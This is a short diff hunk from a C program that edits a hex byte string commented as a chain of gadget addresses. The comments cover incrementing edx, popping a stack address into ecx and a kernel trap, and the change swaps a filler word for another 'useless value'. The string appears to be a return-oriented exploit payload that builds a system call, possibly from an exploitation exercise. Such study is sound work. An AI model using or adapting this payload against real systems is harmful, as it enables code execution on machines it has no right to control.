@@ -87,7 +87,7 @@ int main(void)
                       "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
                       "\x8a\xb8\xb7\xbb" // inc edx now value 3
-                      "\x09\x09\x09\x09"
+                      "\x38\x38\xb9\xbb" // useless value
                       "\x22\xA4\xBA\xBB\x04\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                       "\xE5\xB6\xA9\xBB" // trap into kernel
